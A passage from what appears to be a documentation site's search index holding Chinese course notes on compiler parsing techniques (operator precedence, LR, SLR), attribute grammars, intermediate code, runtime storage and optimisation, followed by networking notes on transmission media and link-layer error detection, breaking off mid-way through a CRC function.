\\rightarrow \\beta$$ 的直接短语。 一个句型的最左直接短语称为该句型的句柄。  分析过程描述：可以用 步骤、符号栈、输入串、所用产生式 四元组来描述。\n算符优先法 #  定义 #  优先关系：\n 任何两个可能相继出现的终结符的终结符 a 与 b 可能三种优先关系：  $$a \\lessdot b$$，a 的优先级低于 b $$a \\doteq b$$，a 的运算级等于 b $$a \\gtrdot b$$，a 的运算级高于 b   算符优先关系与数学上的 \u0026lt; \u0026gt; = 不同：  $$+ \\lessdot + $$ → 右边的加号比左边的加号优先级高，即算术右结合 $$a \\lessdot b$$ 并不意味着 $$b \\gtrdot a$$    算符文法：\n 如果一个文法的任一产生式的右部都不含两个相继的非终结符，即不含 ...QR... 形式的产生式右部，则我们称该文法为算符文法。 假设 G 是一个不含 $$\\epsilon$$-产生式的算符文法。对于任何一对终结符 a、b，我们说：  $$a \\doteq b$$，当且仅当文法 G 中含有形如 $$P \\rightarrow \u0026hellip;ab\u0026hellip;$$ 或 $$P \\rightarrow \u0026hellip;aQb\u0026hellip;$$ 的产生式 $$a \\lessdot b$$，当且仅当 G 中含有形如 $$P \\rightarrow \u0026hellip;aR\u0026hellip;$$ 的产生式，且有 $$R \\overset{+}{\\Rightarrow} b\u0026hellip;$$ 或 $$R \\overset{+}{\\Rightarrow} Qb\u0026hellip;$$ $$a \\gtrdot b$$，当且仅当 G 中含有形如 $$P \\rightarrow \u0026hellip;Rb\u0026hellip;$$ 的产生式，且有 $$R \\overset{+}{\\Rightarrow} \u0026hellip;a$$ 或 $$R \\overset{+}{\\Rightarrow} \u0026hellip;aQ$$   如果一个算符文法 G 中的任何终结符对 $$(a, b)$$，至多只满足 $$a \\doteq b$$、$$a \\lessdot b$$ 和 $$a \\gtrdot b$$ 这三个关系之一，则称 G 是一个算符优先文法。  构造优先关系表 #  算法：\n 确定所有满足 $$\\doteq$$ 的所有终结符对：  通过检查 G 的每个产生式的候选式；   确定满足关系 $$\\lessdot$$ 和 $$\\gtrdot$$ 的所有终结符对：  先构造下面两个集合：  $$FIRSTVT(P) = {a | P \\overset{+}{\\Rightarrow} a\u0026hellip; \\or P \\overset{+}{\\Rightarrow} Qa\u0026hellip;, a \\in V_T \\and Q \\in V_N}$$ $$LASTVT(P) = {a | P \\overset{+}{\\Rightarrow} \u0026hellip;a \\or P \\overset{+}{\\Rightarrow} \u0026hellip;aQ, a \\in V_T \\and Q \\in V_N}$$   检查每个产生式的候选式：  假定一个产生式有一个候选式为 $$\u0026hellip;aP\u0026hellip;$$，那么，对于任何 $$b \\in FIRSTVT(P)$$，我们都有 $$a \\lessdot b​$$； 假定一个产生式有一个候选式形为 $$\u0026hellip;Pb\u0026hellip;$$，那么，对于任何 $$a \\in LASTVT(P)$$，有 $$a \\gtrdot b$$。      构造集合 $$FIRSTVT(P)$$ 的算法：\n 反复使用下面的两条规则构造集合 $$FIRSTVT(P)$$：  若有产生式 $$P \\rightarrow a\u0026hellip;$$ 或 $$P \\rightarrow Qa\u0026hellip;$$，则 $$FIRSTVT(P) += {a}$$ 若 $$\\exist P \\rightarrow Q\u0026hellip;$$，则 $$FIRSTVT(P) += FIRSTVT(Q)$$   不断扫描，直到在一整次扫描中没有一个 $$FIRSTVT$$ 集合发生变化。  一个实现的伪代码：\nGLOBAL:\rSTACK stack;\rBOOLEN array[ size(V_N) ][ size(V_T) ];\rINIT:\rfor prod in PROD; do\ra = prod.right.first_V_T()\rp = prod.left\rarray[p][a] = true\rstack.push([p, a])\rdone\rMAIN:\rwhile not stack.empty(); do\rtop = stack.pop()\rQ, a = top[0], top[1]\rfor prod in PROD; do\rQc = prod.right.first_symbol()\rP = prod.left\rif (Qc is Q) and (array[P][a] is false); then\rarray[P][a] = true\rstack.push([P, a])\rendif\rdone\rdone\r其中 array[P][] 中所有为 true 的列就是 $$FIRSTVT(P)$$ 集合。\n同理可以构造 $$LASTVT(P)$$ 集合：\n 反复使用下面的两条规则构造集合 $$LASTVT(P)$$：  若有产生式 $$P \\rightarrow \u0026hellip;b$$ 或 $$P \\rightarrow \u0026hellip;Qb$$，则 $$LASTVT(P) += {b}$$ 若 $$\\exist P \\rightarrow \u0026hellip;Q$$，则 $$LASTVT(P) += LASTVT(Q)$$   不断扫描，直到在一整次扫描中没有一个 $$LASTVT$$ 集合发生变化。  同样的也可以写出伪代码实现。\n算符优先分析算法 #  概念：\n 素短语：至少含有一个终结符且不再含任何比它自身更小的素短语。 最左素短语：处于句型最左边的那个素短语。  最左素短语定理：\n  算符优先文法句型的一般形式为：\n$$\\begin{align}sentence: \u0026amp;#N_1a_1N_2a_2\u0026hellip;N_na_nN_{n+1}#,\\ where: \u0026amp;\\forall i, a_i \\in V_T, N_i \\in V_N \\cap{\\epsilon}\\end{align}$$\n  则定理：一个满足以下条件的最左边的子串 $$N_ia_i\u0026hellip;N_ja_j$$ 是最左素短语：\n $$a_{i-1} \\lessdot a_i$$ $$\\forall s,t \\in [i, j], a_s \\doteq a_t$$ $$a_j \\gtrdot a_{j+1}$$    算符优先分析算法的伪代码描述：\nGLOBAL:\rSTACK analysis;\rSTACK input;\rINIT:\rtop = 1\ranalysis.push('#')\rMAIN:\rrepeat\ra = input.pop()\rj = (analysis[top] in V_T) ? top : top-1\r# WHILE:\r# repeat until the precedence of top symbol is greater than the next symbol\rwhile precedence_greater(S[j], a); do\r# REPEAT:\r# find the terminal symbol position in stack where its precedence is less than the continous topper one\rrepeat\rQ = analysis[j];\rj = (analysis[j-1] in V_T) ? j-1 : j-2;\runtil precedence_less(analysis[j], Q)\r# `REDUCT` function is used to reduct list of symbol into a non-terminal symbol.\rN = REDUCT(analysis[j+1], S[top]);\rtop = j+1\ranalysis[top] = N\rdone\r# IF:\r# if the next symbol is legal, push it into the stack\rif precedence_less(S[j], a) or precedence_equal(S[j], a); then\rtop++, S[top] = a;\relse ERROR; fi\runtil a is '#';\rLR 分析法 #  定义 #  规范规约：\n 假定 $$\\alpha$$ 是文法 G 的一个句子且满足以下的条件，则我们称序列 $$\\alpha_n, \\alpha_{n-1}, \u0026hellip;, \\alpha_0$$ 是 $$\\alpha$$ 的一个规范规约：  $$\\alpha_n = \\alpha$$ $$\\alpha_0 = S$$ $$\\forall i, 0 \\lt i \\le n$$，$$\\alpha_{i-1}$$ 是从 $$\\alpha_i$$ 经把句柄替换成相应产生式的左部符号得到的。   NOTICE：规范规约得到的树是语法树，但是算符优先分析方法得到的树不是语法树（算符优先分析方法不是规范规约）。  规范推导：\n 因为规范规约是最左规约，规范规约的逆过程就是最右推导。最右推导也称规范推导，由规范推导推出的句型又叫规范句型。  LR 文法：\n 对于一个文法，如果能够构造一张分析表，使得它的每个入口均是唯一确定的，则这个文法就称为 LR 文法。 一个文法，如果能够用一个每步最多向前检查 k 个输入符号的 LR 分析器进行分析，则这个文法就称作 LR(k) 文法。 LR 文法 $$\\subset$$ 无二义文法。  LR 分析表：LR 分析器的核心是一张分析表：\n ACTION[s, a]：当前状态 s 面临输入符号 a 时，应该采取什么动作。比如：  s5：表示 shift，表示把当前文法符号移进入栈，并且将状态 5 压栈。 r4：表示 reduce，表示用第 4 个产生式规约，把产生式右部和状态弹出栈，把 GOTO[栈顶状态, 产生式左部] 和 产生式左部 非终结符移入栈。   GOTO[s, X]：状态 s 面对文法符号 X 时，下一个状态是什么。 acc：宣布分析成功，停止分析器工作。 空白：不允许出现的情况，出现了需要报错。  活前缀 #  字的前缀、活前缀：\n 字的前缀：字的任意首部。 活前缀：指规范句型的一个前缀，这种前缀不含句柄之后的任意符号。  即：如果 $$\\beta$$ 是 $$\\alpha \\beta \\delta$$ 的句柄，如果 $$\\alpha \\beta = u_1 u_2 \u0026hellip; u_r$$，则符号串 $$u_1 u_2 \u0026hellip; u_i (1 \\le i \\le r)$$ 是 $$\\alpha \\beta \\delta$$ 的一个活前缀。    拓广文法：\n 构造文法 G'，它包含了整个 G，并且引进不出现在 G 中的新的开始符号非终结符 S'、以及产生式 $$S' \\rightarrow S$$。  $$LR(0)$$ 项目：\n 在每个产生式右部添加一个圆点，表示我们在分析过程中看到了产生式的多大部分。 $$A \\rightarrow \\alpha \\cdot$$ 称为 “规约项目” $$S' \\rightarrow \\alpha \\cdot$$ 称为 “接受项目”（“接受项目” $$\\subset$$ “规约项目”） $$A \\rightarrow \\alpha \\cdot a \\beta$$ 称为 “移进项目” $$A \\rightarrow \\alpha \\cdot B \\beta$$ 称为 “待约项目”  构造识别活前缀的 DFA：\n  构造识别文法所有活前缀的 NFA：\n  ${\\displaystyle State(i): X \\rightarrow X_1 X_2 \u0026hellip; X_{i-1} \\cdot X_i\u0026hellip;X_n}$\n${\\displaystyle State(j):X \\rightarrow X_1 X_2\u0026hellip;X_i \\cdot X_{i+1} \u0026hellip; X_n}$\n${\\displaystyle \\Rightarrow f(State(i), X_i) = State(j) }$\n  ${\\displaystyle State(i): X \\rightarrow \\alpha \\cdot A \\beta}$\n$ State(j): A \\rightarrow \\cdot \\gamma $\n$\\Rightarrow f(State(i), \\epsilon) = State(j) $\n    把该识别文法所有活前缀的 NFA 确定化为 DFA。\n  PS：构成识别一个文法活前缀的 DFA 的项目集（状态）的全体称为文法的 LR(0) 项目集规范族。\n  构造的另一种方法（通过有效项目集）：\n  有效项目：项目 $$A \\rightarrow \\beta_1 \\cdot \\beta_2$$ 对活前缀 $$\\alpha \\beta_1$$ 是有效的，如果存在规范推导：$$S' \\overset{*}{\\Rightarrow}_R \\alpha A \\omega \\Rightarrow_R \\alpha \\beta_1 \\beta_2 \\omega $$\n  定理：若项目 $$A \\rightarrow \\alpha \\cdot B \\beta$$ 对于活前缀 $$\\eta = \\delta \\alpha$$ 是有效的且 $$B \\rightarrow \\gamma$$ 是一个产生式，则项目 $$B \\rightarrow \\cdot \\gamma$$ 对 $$\\eta = \\delta \\alpha$$ 也是有效的。\n  构造项目集 I 的闭包 $$CLOSURE(I)$$：\n I 的任何项目都属于 $$CLOSURE(I)$$； 若 $$A \\rightarrow \\alpha \\cdot B \\beta$$ 属于，任意关于 B 的产生式 $$B \\rightarrow \\gamma$$，项目 $$B \\rightarrow \\cdot \\gamma$$ 也属于 $$CLOSURE(I)$$； 重复执行上述两步直至 $$CLOSURE(I)$$ 不再增大为止。    状态转换函数 GO：对于 I 是一个项目集，X 是一个文法符号，则：\n$$\\begin{align} GO(I, X) \u0026amp;= CLOSURE(J) \\where\\ J \u0026amp;= {A \\rightarrow \\alpha X \\cdot \\beta \\mid (A \\rightarrow \\alpha \\cdot X \\beta) \\in I} \\end{align}$$\n  构造方法：\n  $$State := {CLOSURE({S' \\rightarrow \\cdot S})}$$\n  对于 State 中的每个项目集 I 和 G' 中的每个文法符号 X：\n$$State += GO(I, X), where\\ GO(I, X) \\neq \\varnothing \\and GO(I, X) \\notin State $$\n  重复第二步直到 State 不再增大。\n    LR(0) 分析表 #  假若一个文法 G 的拓展文法 G' 的活前缀识别自动机中的每个状态（项目集）不存在以下的情况，则称 G 是一个 LR(0) 文法。\n 既含移进项目又含规约项目； 含有多个规约项目。  构造 LR(0) 分析表的算法：\n 令每个项目集 $$I_k$$ 的下标 k 作为分析器的状态，包含项目 $$S' \\rightarrow \\cdot S$$ 的集合 $$I_k$$ 的下标 k 为分析器的初始状态。 构造分析表的 ACTION 子表：  若项目 $$A \\rightarrow \\alpha \\cdot a \\beta$$ 属于 $$I_k$$ 且 $$GO(I_k, a) = I_j$$，a 为终结符，则置 $$ACTION[k, a] = \u0026ldquo;sj\u0026rdquo;$$（动作移进，进入状态j） 若项目 $$A \\rightarrow \\alpha \\cdot$$ 属于 $$I_k$$，那么，$$\\forall a \\in V_N, a \\in FOLLOW(A)$$，置 $$ACTION[k, a] = \u0026ldquo;rj\u0026rdquo;$$（动作规约，使用第 j 个产生式 $$A \\rightarrow \\alpha$$） 若项目 $$S' \\rightarrow S \\cdot$$ 属于 $$I_k$$，则置 $$ACTION[k, $] = \u0026ldquo;acc\u0026rdquo;$$（动作接受）   构造分析表的 GOTO 子表：  若 $$GO(I_k, A) = I_j$$，其中 A 为非终结符，则置 $$GOTO[k, A] = j$$（在第 k 个状态，栈顶是 A 符时，下一个状态是 j）   分析表中凡不能用规则上述规则填入信息的空白格均填入 “报错标志”。  SLR(1) 分析法 #  LR(0) 中，一个项目集可能会包含多个规约项目，因为规约使用的规则必须向前看一个单词才可以选择规则进行规约，因此引入了 SLR(1) 分析法。其中 S 指 Simple，1 指最多向前看一个单词。\nLR(0) 冲突解决办法：\n 假定一个 $$LR(0)$$ 规范族中含有如下的项目集 $$I = {X \\rightarrow a \\cdot b \\beta, A \\rightarrow \\alpha \\cdot, B \\rightarrow \\alpha \\cdot}$$，其中：$$I \\in S, FOLLOW(A) \\cap FOLLOW(B) = \\varnothing, b \\notin FOLLOW(A) \\cup FOLLOW(B)$$ 当状态 I 面临输入符号 a 时，可以：  若 $$a = b$$，则移进 若 $$a \\in FOLLOW(A)$$，用产生式 $$A \\rightarrow \\alpha$$ 进行规约； 若 $$a \\in FOLLOW(B)$$，用产生式 $$B \\rightarrow \\alpha$$ 进行规约； 此外，报错。    更一般的：\n 假定一个 $$LR(0)$$ 规范族中含有如下的项目集 $$I = {A_1 \\rightarrow \\alpha \\cdot a_1 \\beta_1, A_2 \\rightarrow \\alpha \\cdot a_2 \\beta_2, \u0026hellip;, A_m \\rightarrow \\alpha \\cdot a_m \\beta_m, B_1 \\rightarrow \\alpha \\cdot, B_2 \\rightarrow \\alpha \\cdot, \u0026hellip;, B_n \\rightarrow \\alpha \\cdot }$$，其中：$$I \\in S; \\forall k \\le m, i,j \\le n, FOLLOW(B_i) \\cap FOLLOW(B_j) = \\varnothing, b_k \\notin FOLLOW(B_i) \\cup FOLLOW(B_j)$$ 当状态 I 面临输入符号 a 时，可以：  若 $$a \\in {a_i \\mid 0 \u0026lt; i \\le m }$$，则移进 若 $$a \\in FOLLOW(B_i), 0 \u0026lt; i \\le n$$，用产生式 $$B_i \\rightarrow \\alpha$$ 进行规约； 此外，报错。    LASR(1) 分析法 #  可以构造一个比规范 LR 分析表更小的分析表。其中 LA 指 lookhead。\n同心项目集：（没看懂）\n对于一个拓广文法 G'，构造 LASR(1) 的分析表方法如下：\n 构造 LR(1) 项目集规范族 $$C = {I_0, I_1, \u0026hellip;, I_n}$$ 将同心集合并 令 $$C' = {J_0, \u0026hellip;, J_m}$$ 为合并后项目集，构造 action 子表，如果有冲突则合并失败； 。。。  LR 分析产生器 YACC #  YACC (Yet Another Compiler Compiler)\nLR 的变种：SALR(1)\n"},{"id":201,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E5%B1%9E%E6%80%A7%E6%96%87%E6%B3%95%E5%92%8C%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/","title":"3.属性文法和语法制导翻译","section":"编译原理","content":" 学习地址：\n 国防科技大学中国大学 MOOC   属性文法 #  概念 #  属性文法：\n 也称作属性翻译文法 以上下文无关文法为基础  为每个文法符号（终结符或非终结符）配备若干相关的 “值”（称为属性），代表与文法符号相关的信息，如类型、值、代码序列、符号表内容等。 对于文法的每个产生式都配备了一组属性的语义规则，对属性进行计算和传递。    综合属性：\n 自下而上传递信息 从语法规则角度看：根据右部候选式中的符号的属性计算左部被定义符号的综合属性 从语法树角度看：根据子节点的属性和父节点自身的属性计算父节点的综合属性  继承属性：\n 自上而下传递信息。 从语法规则角度看：根据右部候选式中的符号的属性和左部被定义符号的属性计算右部候选式。 从语法树角度看：根据父节点和兄弟结点的属性计算子节点的继承属性。  属性依赖 #  属性依赖：\n  对于没和产生式 $$A \\rightarrow \\alpha $$ 都有一套与之相关联的语义规则，每条规则的形式为：$$b := f(c_1, c_2, \u0026hellip; c_k)$$，则我们说：属性 b 依赖于属性 $$c_1, c_2, \u0026hellip;, c_k$$。其中有两种可能性：\n  b 是 A 的一个综合属性并且 $$c_1, c_2, \u0026hellip;, c_k$$ 是产生式右边文法符号的属性\n  b 是产生式右边某个文法符号的一个继承属性并且 $$c_1, c_2, \u0026hellip;, c_k$$ 是 A 或产生式右边任何文法符号的属性\n    终结符只有综合属性，由词法分析器提供。\n  非终结符既可以有综合属性也可以有继承属性，文法开始符号的所有继承属性作为属性计算前的初始值。\n  语义规则：\n 对出现在产生式右边的继承属性和出现在产生式左边的综合属性都必须提供一个计算规则。属性计算规则中只能使用相应产生式中的文法符号的属性。 出现在产生式左边的继承属性和出现在产生式右边的综合属性不由所给产生式的属性计算规则进行计算，由其他产生式的属性计算规则进行计算或者由属性计算器的参数提供。 语义规则所描述的工作可以包括属性计算、静态语义检查、符号表操作、代码生成等。  属性计算 #  由源程序的语法结构所驱动的处理办法就是语法制导翻译法。\n基于属性文法的处理办法：依赖图、树遍历、一遍扫描。\n依赖图 #  在一棵语法树中，结点的继承属性和综合属性之间的相互依赖关系可以用依赖图来描述。\n依赖图的构造：\n 依赖图中为每一个属性设置一个结点； 如果属性 b 依赖与属性 c，则从属性 c 的结点有一条有向边链接到属性 b 的结点。  S-属性文法 #  S-属性文法：只含有综合属性的文法。\n适合一遍扫描的自下而上分析。\n计算（在自下而上的分析器分析输入符号串的同时计算综合属性）：\n 在分析栈中添加一个附加域存放综合属性值  L-属性文法 #  L-属性文法：继承属性依赖父节点，或左兄弟结点。\n"},{"id":202,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/","title":"4.语义分析和中间代码生成","section":"编译原理","content":" 学习地址：\n 国防科技大学中国大学 MOOC   语义分析和中间代码生成 #  中间语言 #  特点：\n 独立于机器 复杂性介于源语言和目标语言之间  常用的中间语言：\n  后缀式，逆波兰式表示\n  图表示：抽象语法树（AST）、有向无环图（DAG）\n  三地址代码：三元式、四元式、间接三元式\n  后缀式 #  Lukasiewicz 发明的一种表达式的方法，又称逆波兰表示法。\n一个表达式 E 的后缀形式可以如下定义：\n 如果 E 是一个常量或变量，则 E 的后缀式是 E 自身。 如果 E 是 $$E_1\\ op\\ E_2$$ 形式的表达式，其中 op 是任何二元操作符，则 E 的后缀形式为 $$E_1’ E_2' op$$，其中 $$E_1'$$ 和 $$E_2'$$ 分别是 $$E_1$$ 和 $$E_2$$ 的后缀形式。 如果 E 是 $$(E_1)$$ 形式的表达式，那么 $$E_1$$ 的后缀式就是 E 的后缀式。  图表示 #  有向无环图（Directed acyclic Graph，简称 DAG）:\n 对表达式中的每个子表达式，DAG 中都有一个结点 一个内部结点代表一个操作符，它的孩子表示操作数 在一个 DAG 中代表公共子表达式的结点具有多个父节点。  与 AST 区别的一个简单示例：\n三地址代码 #  基本形式：x := y op z\n三地址代码可以看作是 AST 或 DAG 的一种线性表示。\n 对抽象语法树进行自下而上，自左而右的遍历  三地址的语句种类：\nx := y op z\t# 双目运算符\rx := op y\t# 单目运算符\rx := y\t# 直接赋值\rgoto L\t# 无条件跳转\rif x relop y goto L\rif a goto L\t#条件跳转\rparam x\t# 传参\rcall p, n\t# 调用过程\rreturn y\t# 返回\rx := y[i]\rx[i] := y\t# 索引赋值\rx := \u0026amp;y\rx := *y\r*x := y\t# 地址和指针赋值\r四元式实现：\n 一个带有四个域的记录结构，这四个域分别为 op、arg1、arg2 以及 result。  三元式实现：\n 只用三个域表示 op、arg1 以及 arg2 计算结果引用：引用计算该值的语句的位置  中间代码生成 #  "},{"id":203,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/6.%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9A%84%E5%AD%98%E5%82%A8%E7%A9%BA%E9%97%B4%E7%BB%84%E7%BB%87/","title":"6.运行时的存储空间组织","section":"编译原理","content":" 学习途径：\n 国防科技大学中国大学 MOOC   运行时存储空间组织 #  参数传递 #  参数传递主要有四种传递方式：\n 传地址； 得结果：传地址的变形。  每个形参对应两个形式单元：第一个存放实参地址；第二个存放值。 在过程体中的任何引用或赋值都看作对它的第二个单元的直接访问。 过程完成返回之前，把第二个单元的值存放到第一的单元所指向中。   传值； 传名：不常见。  在进入被调用过程之前不对实在参数预先进行计值，而是让过程提中每当使用到相应的形式参数时才祝词对它实行计值（或计算地址）。 通常把实在参数处理成一个子程序（称为参数子程序），每当过程体中使用到相应的形式参数时就调用这个子程序。    运行时存储器的划分 #  一个目标程序运行时所需的存储空间包括：\n  存储目标代码的空间 $$\\Rightarrow$$ 算法\n  存放数据项目的空间 $$\\Rightarrow$$ 数据结构\n  存放程序运行的控制或连接数据所需要的单元\n  编译程序组织存储空间须考虑的问题：\n 过程是否允许递归？ 当控制从一个过程的活动返回时，对局部名称的值如何处理？ 过程是否允许引用非局部名称？ 过程调用时如何传递参数？“过程”是否可以做为参数被传递和作为结果返回？ 存储空间可否在程序控制下进行动态分配？ 存储空间是否必须显式地释放？  存储分配策略 #  主要有两种分配策略：\n  静态分配策略：在编译时能确定数据空间的大小，并且为每个数据项目确定出在运行时刻的存储空间中的位置。比如：FORTRAN 语言。\n  动态分配策略：在编译时不能确定运行时数据空间的大小，允许递归过程和动态申请释放内存。\n  栈式动态分配、堆式动态分配。\n  函数调用使用栈式分配策略，变量空间使用堆式动态分配。\n    非嵌套过程语言 #  特点：\n 允许过程递归调用、可以允许可变数组 过程定义不允许嵌套（即 不可以在函数内部定义函数） 比如：C 语言。  其过程管理通过栈式管理，一个程序中，按以下方式调用 main -\u0026gt; Q -\u0026gt; R -\u0026gt; Q，则其运行栈结构大致如下：\n过程调用和过程返回：\n  过程调用的语句 P(T1, T2, ..., Tn)，翻译称下面的代码序列：\npar T1\rpar T2\r...\rpar Tn\rcall P, n\r  过程调用的目标代码通过以下的方式生成：\n每个 par Ti 可以翻译成如下的指令：\n# 传值方式翻译\r(i+3)[TOP] := Ti\r# 传地址方式翻译\r(i+3)[TOP] := addr(Ti)\r对于 call P, n 则翻译成以下的指令\n1[TOP] := SP\r3[TOP] := n\rJSR P\t# 跳转指令\r转进过程 P 后，首先执行下述指令\nSP := TOP + 1\r1[SP] := 返回地址\rTOP := TOP + L\r其中，L 为过程 P 的火丁记录所需要的单元数，在编译时可确定。\n  过程返回时，应执行下面的指令：\nTOP := SP - 1\rSP := 0[SP]\rX := 2[TOP]\rUJ 0[X]\r  嵌套过程语言 #  特点：\n 允许过程递归调用、也可以允许可变数组 过程定义允许嵌套 比如：PASCAL 语言  因为程序运行时，过程可以访问外层过程的变量。程序运行时，必须能知道它所有外层过程的当前活动记录的起始地址。\n非局部名字的访问\u0026ndash;静态链表方法 #  嵌套层次：\n 主程序的层次为 0 在第 i 层中定义的过程，其层次为 i+1  每一个局部变量用一个 嵌套层数 + 地址偏移量 的二元组唯一确定。并增加以下两个变量：\n  动态链：指向本过程的调用过程的活动记录的起始地址，也称控制链。\n  静态链：指向本过程的直接外层过程的活动记录起始地址，也称存取链。\n  比如，一个 $$P \\overset{call}{\\rightarrow} S \\overset{call}{\\rightarrow} Q \\overset{call}{\\rightarrow} R \\overset{call}{\\rightarrow} R$$ 的调用栈帧如下图所示：\n对于调用过程 $$P_1 \\xrightarrow{call} P_2$$，如何根据调用过程 P1 的活动记录建立 P2 的静态链？\n 第 N 层过程调用第 N+1 层过程：P2 的静态链为调用过程 P1（第 N 层过程的）的最新活动记录的起始地址。 第 N 层过程调用第 N 层过程：P2 的静态链为调用过程 P1（第 N 层过程）的静态链的值。 第 N 层过程调用第 N-x 层过程：P2 的静态链为沿着调用过程 P1（第 N 层过程）的静态链向前走 x 步到达的活动记录的静态链的值。  非局部名字的访问\u0026ndash;Display 表方法 #  Display 表：\n 在活动记录中增加一个 Display 表：  进入一个过程时，    "},{"id":204,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/7.%E4%BC%98%E5%8C%96/","title":"7.优化","section":"编译原理","content":" 学习途径：\n 国防科技大学中国大学 MOOC   优化 #  优化的种类：\n 删除多余运算（删除公用子表达式） 合并已知量 复写传播 删除无用赋值 代码外提 强度消弱 变换循环控制条件  优化的级别：\n 局部优化 循环优化 全局优化  局部优化 #  基本块的划分 #  基本块：\n 程序中以顺序执行的语句序列； 其中只有一个入口和一个出口。入口就是其中的第一个语句，出口就是其中的最后一个语句。  划分算法：\n  找到中间语句（三地址语句）程序中的各个基本快的入口语句。它可能是\n 程序的第一个语句； 能够由条件转移语句或无条件转移语句转移到的语句； 紧跟在条件转移语句后面的语句。    对以上求出的每个入口语句，确定其所属的基本快。\n它是由该入口语句 A 到下一入口语句 B（不包括 B）、或到一转移语句 B（包括 B）、或停语句 B（包括 B）之间的语句序列组成的。\n  凡未被纳入某一基本块中的语句，可以从程序中删除。\n  "},{"id":205,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1.%E7%89%A9%E7%90%86%E5%B1%82/%E7%89%A9%E7%90%86%E5%B1%82/","title":"物理层","section":"1.物理层","content":"物理层 #  常见的传输介质 #  引导型传输媒介 #  双绞线 #  即常用的网线，最常用的 UTP 是 5 类线 CTA5：\n有许多种不同的标准适用于这种基于的铜线的物理介质。最广泛使用的包括 10BASE-T、100BASE-TX 和1000BASE-T (吉比特以太网), 速率分别为10 Mbit/s, 100 Mbit/s, and 1000 Mbit/s (1 Gbit/s)。\n双绞线有一个“无法逾越”的“100米”传输距离。无论是 10M 传输速率的三类双绞线，还是 100M 传输速率的五类双绞线，甚至 1000M 传输速率的六类双绞线，最远有效传输距离为 100 米。\n同轴电缆 #  同轴电缆具有很好的抗干扰特性，被广泛用于传输较高速率的数据：\n光缆 #  通信容量非常大、传输损耗小，中继距离长、抗雷电和电磁干扰性能好、无串音干扰，保密性好、体积小，重量轻。\n 光纤由三层材料组成，中心高折射率玻璃芯，中间为低折射率硅玻璃包层，最外是加强用的树脂涂层。 包层的材料一般用纯二氧化硅，也有掺极微量的三氧化二硼。掺杂的作用是降低材料的光折射率。 涂层是用来保护光纤不受外来的损害，增加光纤的机械强度。  非引导型传输媒介 #  协议 #  10BASE-T #  10BASE－T 是双绞线以太网，1990年由IEEE新认可的，编号为 IEEE802.3i，T 表示采用双绞线，现 10BASE-T 采用的是无屏蔽双绞线（UTP）。\n  数据传输速率 10Mbps基带传输，10表示10兆比特每秒，Bas e表示基带传输，T 代表双绞线（F 表示光纤）\n  每段双绞线最大有效长度 100m，采用高质量的双绞线（5类线），最大长度可到 150m（HUB与工作站间及两个HUB之间）。\n  一条通路允许连接HUB数 4个\n  拓扑结构 星形或总线形\n  访问控制方式 CSMA/CD\n  帧长度 可变，最大1518个字节\n  最大传输距离 500m\n  每个HUB可连接的工作站 96个\n  10BASE-T 的连接主要以集线器HUB作为枢纽(HUB将在第5节中介绍)，工作站通过网卡的 RJ45 插座与 RJ45 接头相连，另一端 HUB 的端口都可供 RJ45 的接头插入，装拆非常方便。\n"},{"id":206,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/2.%E9%93%BE%E8%B7%AF%E5%B1%82/%E9%93%BE%E8%B7%AF%E5%B1%82/","title":"链路层","section":"2.链路层","content":" 学习地址：\n 《计算机网络：自顶向下的方法》   链路层 #  概念 #  结点（node）：运行链路层协议的任何设备（比如：主机、路由器、交换机和 WiFi 接入点）。\n链路（link）：沿着通信路径连接响铃结点的通信信道。\n链路层协议能提供可能的服务包括：\n 成帧（framing）：一个帧由一个数据字段（网络层数据报）和若干个首部字段组成。 链路接入：媒体访问控制（Medium Access Control, MAC）协议规定了帧在链路上传输的规则。 可靠交付：当链路层协议提供可靠交付服务时，它保证无差错地经链路层移动每个数据报网络。 差错检测和纠正  链路层的主体部分是在网络适配器（network adapter）中实现的，网络适配器有时也称作网络接口卡（Network Interface Card, NIC）。\n位于网络适配器核心的是链路层控制器，该控制器通常是一个实现了许多链路层服务的专用芯片（例如，Intel 的 8254x 控制器实现了以太网协议，Atheros AR5006 控制器实现了 802.11 WiFi 协议）\n差错检测和纠正技术 #  奇偶校验 #  差错检测最简单的方式就是奇偶校验位（parity bit）。实现方式：\n 发送方需要包含一个附加的比特位，使得所有比特中，1 的总数总是一个偶数。 接收方只要检测到奇数个值位 1 的比特位，则传输信息出现了差错。  使用二维奇偶校验（two-dimensional parity）方案，包含值改变的列和行的校验值都将会差错，因此可以予以纠正，如下：\n接收方检测和纠正差错的能力被称为前向纠正（Forward Error Correction, FEC）。\n检验和 #  因特网检验和（Internet checksum）就基于这种方法，即数据的字节作为 16 比特的整数对待并求和，这个和的反码形成了携带在报文段首部的因特网检验和。\n循环冗余检测 #  循环冗余检测（Cyclic Redundancy Check, CRC）编码又被称作多项式编码（polynomial code），因为该编码能够将要发送的比特串看作为系数是 0 和 1 的多项式，比特串的操作被解释位多项式算术。\n生成多项式 G（generator）：The sender and receiver must first agree on an r + 1 bit pattern, known as a generator. （Assert max_bit_of(G) == 1 and bit_length_of(G) == r+1）\n发送方通过以下的方式计算 R：\n  Math formula:\n $$(D \u0026laquo; r) \\oplus R \\equiv 0 \\mod{G}$$ 其中 D 是传输信息，r 是协商的给定比特长度，G 是长位 r+1，最高比特位为 1 的比特模式。    Pseudo-code:\ndef crc_remainder(D, G, init): \u0026#39;\u0026#39;\u0026#39; Calculates the CRC remainder of a 